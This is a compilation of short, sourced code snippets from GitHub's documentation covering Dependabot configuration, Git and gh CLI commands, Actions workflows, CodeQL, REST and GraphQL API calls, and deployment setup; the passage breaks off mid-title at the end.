Schedule for npm Updates in YAML\nDESCRIPTION: This snippet demonstrates how to configure the `dependabot.yml` file to check for npm version updates on a weekly schedule, specifically every Tuesday at 02:00 Japan Standard Time (UTC +09:00). This can help manage the frequency of pull requests.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/optimizing-pr-creation-version-updates.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# `dependabot.yml` file with\n# customized schedule for version updates\n\nversion: 2\nupdates:\n  # Keep npm dependencies up to date\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    # Check the npm registry every week on Tuesday at 02:00 Japan Standard Time (UTC +09:00)\n    schedule:\n      interval: \"weekly\"\n      day: \"tuesday\"\n      time: \"02:00\"\n      timezone: \"Asia/Tokyo\"\n```\n\n----------------------------------------\n\nTITLE: Verifying DNS Configuration with dig command (shell)\nDESCRIPTION: This shell command is used to verify the DNS configuration by querying for the TXT record you created. Replace `TXT-RECORD-NAME` with the actual name of the TXT record. The command filters out stats, comments, and command details to provide a cleaner output showing the TXT record's value. This is used after adding the TXT record to your DNS configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-organization-settings/verifying-or-approving-a-domain-for-your-organization.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ndig TXT-RECORD-NAME +nostats +nocomments +nocmd TXT\n```\n\n----------------------------------------\n\nTITLE: Setting local Git username using git config\nDESCRIPTION: This snippet sets the Git username for a single repository using the `git config user.name` command. This configuration will only affect commits made within the specified repository. Requires Git to be installed and the current working directory to be set to the target repository.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/setting-your-username-in-git.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit config user.name \"Mona Lisa\"\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Push of Specific Tags (YAML)\nDESCRIPTION: This workflow configuration will trigger the workflow when a push event occurs that creates or updates a tag that starts with `v1.`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_38\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    tags:\n      - v1.**\n```\n\n----------------------------------------\n\nTITLE: Uploading test results as artifacts\nDESCRIPTION: This snippet configures a workflow to run pytest and upload test results as artifacts, using a matrix strategy to test across multiple Python versions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nname: Python package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python-version: [\"3.9\", \"3.10\", \"3.11\", \"3.12\", \"3.13\"]\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Python # Set Python version\n        uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: {% raw %}${{ matrix.python-version }}{% endraw %}\n      # Install pip and pytest\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install pytest\n      - name: Test with pytest\n        run: pytest tests.py --doctest-modules {% raw %}--junitxml=junit/test-results-${{ matrix.python-version }}.xml{% endraw %}\n      - name: Upload pytest test results\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: {% raw %}pytest-results-${{ matrix.python-version }}{% endraw %}\n          path: {% raw %}junit/test-results-${{ matrix.python-version }}.xml{% endraw %}\n        # Use always() to always run this step to publish test results when there are test failures\n        if: {% raw %}${{ always() }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: CodeQL Database Bundle Command\nDESCRIPTION: This command creates a relocatable archive (zip file) of a CodeQL database. The mandatory arguments are the path to the database and the output file path. It can also include diagnostics, results, logs, and temporary files depending on the provided options. The name of the top-level directory inside the archive can be specified using the `--name` option, otherwise it defaults to the database directory name.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-bundle.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database bundle --output=<output> <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Pushing changes to remote repository using Git\nDESCRIPTION: This shell command pushes the changes from your local repository to the specified remote repository, identified by 'origin', and the specified branch, 'YOUR_BRANCH'. It uploads the commits made in the local branch to the remote repository, making them available to others.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/git/git-push.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git push origin YOUR_BRANCH\n# Pushes the changes in your local repository up to the remote repository you specified as the origin\n```\n\n----------------------------------------\n\nTITLE: Create Discussion Mutation GraphQL\nDESCRIPTION: This GraphQL mutation creates a new discussion. It requires `repositoryId`, `categoryId`, `body`, and `title` as input. The response includes the `id` of the created discussion.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_14\n\nLANGUAGE: GraphQL\nCODE:\n```\nmutation {\n  # input type: CreateDiscussionInput\n  createDiscussion(input: {repositoryId: \"1234\", categoryId: \"5678\", body: \"The body\", title: \"The title\"}) {\n\n    # response type: CreateDiscussionPayload\n    discussion {\n      id\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Globbing Directories for Manifests - YAML\nDESCRIPTION: This snippet demonstrates how to use globbing to specify a range of directories for manifest files within the `dependabot.yml` configuration.  It includes the root directory and directories starting with \"lib-\".\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# Specify the root directory and directories that start with \"lib-\",\n# using globbing, for locations of manifest files\n\nversion: 2\nupdates:\n  - package-ecosystem: \"composer\"\n    directories:\n      - \"/\"\n      - \"/lib-*\"\n    schedule:\n      interval: \"weekly\"\n```\n\n----------------------------------------\n\nTITLE: Specifying API Version with curl\nDESCRIPTION: This code snippet shows how to specify the desired API version using the `X-GitHub-Api-Version` header when making a request with `curl`. It's crucial for ensuring compatibility and avoiding errors due to version mismatches. Replace `{ data reusables.rest-api.version-header }` with the actual header string, like `-H \"X-GitHub-Api-Version:2022-11-28\"`.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/troubleshooting-the-rest-api.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl {% data reusables.rest-api.version-header %} https://api.github.com/zen\n```\n\n----------------------------------------\n\nTITLE: Fetching pull request data programmatically\nDESCRIPTION: Lists pull requests and returns a JSON object containing the number, title, and mergeability status using the `gh pr list` command with the `--json` flag. This allows for programmatically accessing pull request data.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ngh pr list --json number,title,mergeStateStatus\n```\n\n----------------------------------------\n\nTITLE: Regex pattern to enforce Conventional Commits\nDESCRIPTION: This regular expression validates commit messages against the Conventional Commits specification.  It checks for a type (build, chore, ci, etc.), optional scope, optional breaking change indicator, a colon, and a description. It ensures adherence to the conventional commit format. It must be used with the \"Must match a given regex pattern\" requirement.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/rulesets-commit-regex.md#_snippet_4\n\nLANGUAGE: regex\nCODE:\n```\n^(build|chore|ci|docs|feat|fix|perf|refactor|revert|style|test){1}(\\([\\w\\-\\.]+\\))?(!)?: ([\\w ])+([\\s\\S]*)\n```\n\n----------------------------------------\n\nTITLE: Example Build and Publishing (GHES)\nDESCRIPTION: This example demonstrates how to build a new image and push it to the GHES GitHub Packages registry. This example assumes subdomain isolation is enabled.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\n# Build the image with docker.HOSTNAME/OWNER/REPOSITORY/IMAGE_NAME:VERSION\n# Assumes Dockerfile resides in the current working directory (.)\n$ docker build -t docker.HOSTNAME/octocat/octo-app/monalisa:1.0 .\n\n# Push the image to {% data variables.product.prodname_registry %}\n$ docker push docker.HOSTNAME/octocat/octo-app/monalisa:1.0\n```\n\n----------------------------------------\n\nTITLE: Running a Dry-Run Migration for a Bamboo Deployment Project\nDESCRIPTION: This command performs a dry-run migration of a Bamboo deployment project to a GitHub Actions workflow. It creates output files in a specified directory without opening a pull request. The `--deployment-project-id` parameter specifies the ID of the Bamboo deployment project. The `--output-dir` parameter specifies the output directory for the converted workflow files and logs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer dry-run bamboo deployment --deployment-project-id :my_deployment_project_id --output-dir tmp/dry-run\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Runner Job - YAML\nDESCRIPTION: This workflow configures a job to run directly on the runner machine, using a Redis service container. It maps the Redis port on the service container to the Docker host, allowing access to the Redis service. The job installs dependencies and then executes a Node.js script (client.js) to interact with Redis, using environment variables to configure the Redis host and port.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nname: Redis runner example\non: push\n\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps port 6379 on service container to the host\n          - 6379:6379\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to Redis\n        # Runs a script that creates a Redis client, populates\n        # the client with data, and retrieves data\n        run: node client.js\n        # Environment variable used by the `client.js` script to create\n        # a new Redis client.\n        env:\n          # The hostname used to communicate with the Redis service container\n          REDIS_HOST: localhost\n          # The default Redis port\n          REDIS_PORT: 6379\n```\n\n----------------------------------------\n\nTITLE: Configure Git to Use VSCode\nDESCRIPTION: This command configures Git to use VSCode as the default text editor for operations like commit message editing. The `--wait` flag ensures that Git waits for VSCode to be closed before proceeding. This configuration is set globally for the current user.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/associating-text-editors-with-git.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global core.editor \"code --wait\"\n```\n\n----------------------------------------\n\nTITLE: Using Multiple Go Versions\nDESCRIPTION: This workflow uses a matrix strategy to test the Go project with multiple Go versions ('1.19', '1.20', '1.21.x'). It sets up each Go version using the `setup-go` action and then displays the version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-go.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nname: Go\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        go-version: [ '1.19', '1.20', '1.21.x' ]\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Go {% raw %}${{ matrix.go-version }}{% endraw %}\n        uses: {% data reusables.actions.action-setup-go %}\n        with:\n          go-version: {% raw %}${{ matrix.go-version }}{% endraw %}\n      # You can test your matrix by printing the current Go version\n      - name: Display Go version\n        run: go version\n```\n\n----------------------------------------\n\nTITLE: Searching Audit Log by Location\nDESCRIPTION: This snippet demonstrates how to use the `country` qualifier to filter audit log events based on the originating country of the action. It includes examples using both two-letter short codes and full country names, with proper handling of countries with spaces in their names.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/auditing-users-across-your-enterprise.md#_snippet_4\n\nLANGUAGE: text\nCODE:\n```\ncountry:de\n```\n\nLANGUAGE: text\nCODE:\n```\ncountry:Mexico\n```\n\nLANGUAGE: text\nCODE:\n```\ncountry:\"United States\"\n```\n\n----------------------------------------\n\nTITLE: Forecast GitLab Pipeline Migration with Source Files (Shell)\nDESCRIPTION: This command forecasts the effort required to migrate GitLab pipelines using pattern matching for multiple source files.  The `--source-file-path` argument specifies a file path pattern to include multiple source files.  This command helps estimate the migration effort.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer forecast gitlab --output-dir output/ --namespace my-gitlab-namespace --project my-gitlab-project --source-file-path ./tmp/previous_forecast/jobs/*.json\n```\n\n----------------------------------------\n\nTITLE: Using a Custom Configuration File in Workflow\nDESCRIPTION: This YAML snippet configures the `codeql-action/init` action to use a custom configuration file located at `.github/codeql/codeql-config.yml`. The `config-file` parameter specifies the path to the configuration file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    config-file: ./.github/codeql/codeql-config.yml\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_ASSIGNEES to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_ASSIGNEES` to the GitHub Actions equivalent `${{ github.event.pull_request.assignees }}`.  Accesses the assignees of a pull request from the event context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_56\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.assignees }}\n```\n\n----------------------------------------\n\nTITLE: Building OAuth App Authorization Link\nDESCRIPTION: This snippet shows how to build a link to authorization information for an OAuth app. It requires the `client_id` received from GitHub during application registration. The user can review and revoke their application authorizations using this link.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_14\n\nLANGUAGE: http\nCODE:\n```\n{% data variables.product.oauth_host_code %}/settings/connections/applications/:client_id\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database with Custom Build Script\nDESCRIPTION: This snippet demonstrates creating a CodeQL database using a custom build script. It calls the script `./scripts/build.sh`. The script should contain all necessary build commands.  It assumes the script exists, is executable, and CodeQL CLI is installed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_20\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create new-database --language=<language> --command='./scripts/build.sh'\n```\n\n----------------------------------------\n\nTITLE: Checking out a pull request locally with GitHub CLI\nDESCRIPTION: This snippet demonstrates how to check out a pull request locally using the `gh pr checkout` subcommand. Replace `PULL-REQUEST` with the pull request number, URL, or head branch.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests/checking-out-pull-requests-locally.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh pr checkout PULL-REQUEST\n```\n\n----------------------------------------\n\nTITLE: Create an issue via curl with body parameters\nDESCRIPTION: This code creates a new issue using the GitHub REST API's \"Create an issue\" endpoint with `curl`.  It specifies the POST method, the repository endpoint, request headers including authorization using a bearer token, and the issue details (title and body) as a JSON payload.  The `YOUR-TOKEN` placeholder needs to be replaced with a valid personal access token.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ncurl \\\n--request POST \\\n--url \"{% data variables.product.rest_url %}/repos/{% ifversion ghes %}REPO-OWNER/REPO-NAME{% else %}octocat/Spoon-Knife{% endif %}/issues\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"X-GitHub-Api-Version: 2022-11-28\" \\\n--header \"Authorization: Bearer YOUR-TOKEN\" \\\n--data '{\n  \"title\": \"Created with the REST API\",\n  \"body\": \"This is a test issue created by the REST API\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Creating an Azure Web App using Azure CLI\nDESCRIPTION: This snippet demonstrates how to create an Azure App Service web app using the Azure CLI.  It requires the Azure CLI to be installed and configured. Replace the placeholder variables (MY_WEBAPP_NAME, MY_APP_SERVICE_PLAN, MY_RESOURCE_GROUP) with your actual values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-docker-to-azure-app-service.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\naz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --deployment-container-image-name nginx:latest\n```\n\n----------------------------------------\n\nTITLE: Creating Azure Web App using Azure CLI\nDESCRIPTION: This bash script creates an Azure App Service web app with a Node.js runtime using the Azure CLI.  It requires the Azure CLI to be installed and configured. Replace `MY_WEBAPP_NAME`, `MY_APP_SERVICE_PLAN`, and `MY_RESOURCE_GROUP` with appropriate values for your environment.  The command specifies the runtime environment as Node.js version 14-lts.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-nodejs-to-azure-app-service.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\naz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"NODE|14-lts\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving databaseId using GitHub CLI with GraphQL\nDESCRIPTION: These GitHub CLI commands are used to retrieve the `databaseId` for an enterprise using a GraphQL query.  It first logs in with the required scope and hostname, then executes the GraphQL query. Replace `SUBDOMAIN` with the enterprise's subdomain.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/configuring-private-networking-for-github-hosted-runners-in-your-enterprise.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngh auth login -s 'read:enterprise' -h SUBDOMAIN.ghe.com\n\n  gh api graphql --hostname SUBDOMAIN.ghe.com -f query='query($slug: String!) { enterprise (slug: $slug) { slug databaseId } }' -f slug='SUBDOMAIN'\n```\n\n----------------------------------------\n\nTITLE: Example: Generating Multiline Markdown Job Summary in PowerShell\nDESCRIPTION: This YAML configuration generates a multiline markdown list for a job summary.  Each line is appended to `$env:GITHUB_STEP_SUMMARY`. Blank lines can be inserted by appending an empty string.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_47\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Generate list using Markdown\n  run: |\n    \"This is the lead in sentence for the list\" >> $env:GITHUB_STEP_SUMMARY\n    \"\" >> $env:GITHUB_STEP_SUMMARY # this is a blank line\n    \"- Lets add a bullet point\" >> $env:GITHUB_STEP_SUMMARY\n    \"- Lets add a second bullet point\" >> $env:GITHUB_STEP_SUMMARY\n    \"- How about a third one?\" >> $env:GITHUB_STEP_SUMMARY\n\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Copilot CLI Extension\nDESCRIPTION: This command updates the installed GitHub Copilot CLI extension to the latest version. It utilizes the `gh extension upgrade` command followed by the extension's name (`gh-copilot`). This ensures that the user has the most recent features and bug fixes.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/installing-github-copilot-in-the-cli.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngh extension upgrade gh-copilot\n```\n\n----------------------------------------\n\nTITLE: Mapping GITLAB_USER_ID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `GITLAB_USER_ID` to the GitHub Actions equivalent `${{ github.actor }}`. Maps to actor.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_52\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.actor }}\n```\n\n----------------------------------------\n\nTITLE: Listing SSH Keys in .ssh Directory\nDESCRIPTION: This command lists the files in the .ssh directory, which is the default location for SSH keys.  It checks for the existence of SSH keys before generating new ones. The `ls -al ~/.ssh` command will list all files and directories (including hidden ones) in a long listing format within the `.ssh` directory.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/checking-for-existing-ssh-keys.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nls -al ~/.ssh\n```\n\n----------------------------------------\n\nTITLE: Pulling container image by name and version - Docker CLI\nDESCRIPTION: This command pulls a container image from the GitHub Container Registry by its name and a specific version tag. Replace `NAMESPACE` with the account or organization name and `IMAGE_NAME` with the image name. It assumes the image has a tag such as 1.14.1.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ docker pull {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:1.14.1\n```\n\n----------------------------------------\n\nTITLE: Download All Workflow Run Artifacts in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to download all artifacts from a workflow run using the `actions/download-artifact` action without specifying an artifact name.  Each artifact will be placed in a directory named after the artifact's name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Download all workflow run artifacts\n  uses: {% data reusables.actions.action-download-artifact %}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_SOURCE_BRANCH_NAME to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME` to the GitHub Actions equivalent `${{ github.event.pull_request.head.ref }}`. Pull request head.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_65\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.head.ref }}\n```\n\n----------------------------------------\n\nTITLE: Copying files in Init Container - Shell\nDESCRIPTION: This init container copies files from the externals directory to a temporary directory. It uses the 'cp' command to recursively copy all files and subdirectories from '/home/runner/externals/.' to '/home/runner/tmpDir/'. A volume mount is required to provide access to the source and destination directories.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_27\n\nLANGUAGE: Shell\nCODE:\n```\n[\"cp\", \"-r\", \"/home/runner/externals/.\", \"/home/runner/tmpDir/\"]\n```\n\n----------------------------------------\n\nTITLE: Creating a GitHub pull request using gh pr create\nDESCRIPTION: This command initiates the creation of a new pull request in the specified repository. It will guide the user via an interactive session.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngh pr create\n```\n\n----------------------------------------\n\nTITLE: Customizing devcontainer.json with extensions for C# (.NET)\nDESCRIPTION: This code snippet shows the complete configuration of the `devcontainer.json` file for a C# (.NET) project, including forwarding port 5000, running the `dotnet restore` command after creation, and automatically installing the 'streetsidesoftware.code-spell-checker' VS Code extension. The snippet configures vscode specific customizations.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-dotnet-project-for-codespaces.md#_snippet_4\n\nLANGUAGE: JSONC\nCODE:\n```\n// For format details, see https://aka.ms/devcontainer.json. For config options, see the\n// README at: https://github.com/devcontainers/templates/tree/main/src/dotnet\n{\n     \"name\": \"C# (.NET)\",\n     // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n     \"image\": \"mcr.microsoft.com/devcontainers/dotnet:0-7.0\",\n     \"features\": {\n       \"ghcr.io/devcontainers/features/dotnet:1\": {}\n     },\n\n     // Use 'forwardPorts' to make a list of ports inside the container available locally.\n     \"forwardPorts\": [5000],\n     // \"portsAttributes\": {\n     //   \"5001\": {\n     //     \"protocol\": \"https\"\n     //   }\n     // }\n\n     // Use 'postCreateCommand' to run commands after the container is created.\n     \"postCreateCommand\": \"dotnet restore\",\n\n     // Configure tool-specific properties.\n     \"customizations\": {\n       // Configure properties specific to VS Code.\n       \"vscode\": {\n         // Add the IDs of extensions you want installed when the container is created.\n         \"extensions\": [\n           \"streetsidesoftware.code-spell-checker\"\n         ]\n       }\n     }\n\n     // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n     // \"remoteUser\": \"root\"\n   }\n```\n\n----------------------------------------\n\nTITLE: Testing CodeQL CLI Configuration\nDESCRIPTION: This shell command verifies that the CodeQL CLI is correctly configured to create and analyze databases. It checks for available CodeQL packs, listing their versions and locations within the extracted bundle. The command's output helps diagnose issues with query pack locations.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/setting-up-the-codeql-cli.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve packs\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_COMMIT_REF_SLUG to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_COMMIT_REF_SLUG` to the GitHub Actions equivalent `${{ github.ref }}`. The slugified version of the ref name is not directly available and ref is used.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_19\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.ref }}\n```\n\n----------------------------------------\n\nTITLE: Creating a repository for the extension\nDESCRIPTION: Creates a new GitHub repository for the extension, initializes it with the extension's code, and pushes it to GitHub. Replace `EXTENSION-NAME` with the name of your extension. It initializes a git repository, adds all files, commits, and creates a public GitHub repository from the current directory and pushes the code to it.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngit init -b main\ngit add . && git commit -m \"initial commit\"\ngh repo create gh-EXTENSION-NAME --source=. --public --push\n```\n\n----------------------------------------\n\nTITLE: Get Migration Status - REST API\nDESCRIPTION: This snippet shows how to check the status of a migration using the GitHub REST API. A GET request is made to the `/orgs/ORGANIZATION/migrations/MIGRATION_ID` endpoint, replacing `ORGANIZATION` and `MIGRATION_ID`. The request requires authentication via a Bearer token.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_5\n\nLANGUAGE: HTTP\nCODE:\n```\nGET /api/v3/orgs/acme-corp/migrations/123 HTTP/1.1\nAccept: application/vnd.github+json\nAuthorization: Bearer <TOKEN>\nHost: github.acmecorp.net\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"id\": 123,\n  \"state\": \"exported\",\n  // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring rubygems-server with token (YAML)\nDESCRIPTION: This snippet shows how to configure a `rubygems-server` registry using a token for authentication, specifically targeting a GitHub Packages registry. It includes the registry type, URL, and token, and sets replaces-base to true. The token is provided as a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  ruby-github:\n    type: rubygems-server\n    url: https://rubygems.pkg.github.com/octocat/github_api\n    token: ${{secrets.MY_GITHUB_PERSONAL_TOKEN}}\n    replaces-base: true\n```\n\n----------------------------------------\n\nTITLE: Building a Go-based GitHub CLI extension\nDESCRIPTION: This shell command builds a Go-based GitHub CLI extension. It compiles the Go source code into an executable binary for the current operating system and architecture, ready to be used as a `gh` extension.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_15\n\nLANGUAGE: Shell\nCODE:\n```\ngo build\n```\n\n----------------------------------------\n\nTITLE: Processing a Deployment and Updating Status (Ruby)\nDESCRIPTION: This snippet defines the `process_deployment` method, which simulates the work done during a deployment. It parses the payload, prints information to the console, simulates work using `sleep`, and then updates the deployment status to \"pending\" and \"success\" using `@client.create_deployment_status`.  It assumes that `@client` is a pre-configured GitHub API client.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/delivering-deployments.md#_snippet_4\n\nLANGUAGE: Ruby\nCODE:\n```\ndef process_deployment\n  payload = JSON.parse(@payload['payload'])\n  # you can send this information to your chat room, monitor, pager, etc.\n  puts \"Processing '#{@payload['description']}' for #{payload['deploy_user']} to #{payload['environment']}\"\n  sleep 2 # simulate work\n  @client.create_deployment_status(\"repos/#{@payload['repository']['full_name']}/deployments/#{@payload['id']}\", 'pending')\n  sleep 2 # simulate work\n  @client.create_deployment_status(\"repos/#{@payload['repository']['full_name']}/deployments/#{@payload['id']}\", 'success')\nend\n```\n\n----------------------------------------\n\nTITLE: Migrating Bitbucket pipeline to GitHub 